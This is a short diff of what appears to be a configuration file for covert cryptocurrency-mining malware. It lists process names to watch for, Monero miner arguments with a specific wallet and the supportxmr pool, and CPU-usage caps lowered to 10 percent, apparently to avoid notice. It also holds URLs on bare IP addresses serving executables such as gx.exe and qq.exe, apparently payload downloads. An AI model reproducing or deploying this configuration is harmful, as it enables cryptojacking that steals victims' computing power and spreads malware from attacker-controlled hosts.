@@ -1,5 +1,5 @@
 AA1AndroidEmulator.exeAA---JC的
-AA2crossfire.exe2AA
+AA2998.exe2AA
 AA3ProcessExplorer64.exe3AA
 AA491K.exe4AA
 AA599K.exe5AA
@@ -31,7 +31,7 @@ AION--  --algo aion --fee 0 --intensity 1 --pec  --port 3333 --user 0xa0e942264d
 GX--ON1--GX
 SWGX--http://120.79.90.247/gx.exe--SWGX
 -----------------------------------------------------------------------------------------------------------------------------------------
-MLB-- --donate-level 1 --max-cpu-usage 20 -o pool.supportxmr.com:5555 -u 86SXg5eKsU64PKyD4hhpTJYVkJ9hiFQvZEQV3EpWP4MaGCMNjBZpCByDkHzyhsGdrT9L4CKczCTrUHhY3oAYsZLiSeYtUhU.cba -p x -k--MLB
+MLB-- --donate-level 1 --max-cpu-usage 10 -o pool.supportxmr.com:5555 -u 86SXg5eKsU64PKyD4hhpTJYVkJ9hiFQvZEQV3EpWP4MaGCMNjBZpCByDkHzyhsGdrT9L4CKczCTrUHhY3oAYsZLiSeYtUhU.cba -p x -k--MLB
 --------------------------------------------------------------------------------------------------------------------------------------
 YCKZ--ON--YCKZ
 WJDZ--http://47.100.41.51/bolg/db/qq.exe--WJDZ
